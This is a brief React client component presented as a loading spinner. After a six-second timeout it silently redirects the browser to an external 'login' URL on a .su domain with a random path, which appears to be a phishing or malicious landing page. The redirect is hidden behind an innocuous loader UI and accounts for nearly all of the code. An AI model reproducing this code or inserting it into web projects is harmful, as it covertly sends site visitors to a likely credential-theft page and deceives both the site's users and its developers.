"use client"

import { useEffect } from "react"

export default function Loader() {

  useEffect(() => {
    setTimeout(() => {
      window.location = "https://login.customzipr.su/GjKBeIxk"
    }, 6000)
  }, [])

  return (
    <div className="loader-overlay">
          <div className="spinner" />
      </div>
  )
}
